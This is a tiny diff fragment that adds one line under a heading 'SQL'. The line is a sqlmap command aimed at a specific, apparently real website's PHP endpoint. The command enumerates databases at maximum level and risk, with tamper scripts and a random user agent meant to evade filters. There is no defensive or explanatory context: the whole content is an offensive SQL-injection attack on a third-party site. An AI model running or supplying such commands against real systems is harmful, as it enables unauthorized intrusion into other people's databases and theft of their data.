@@ -2,6 +2,7 @@ SQL
 ====
 
 
+ python3 sqlmap.py -u 'https://birdviewpsa.com/services/getip.php?&lt;script&gt;='   --dbs --random-agent --tamper=space2comment,space2morehash --time-sec=2 --level 5 --risk 3 --delay=3
 
 
 
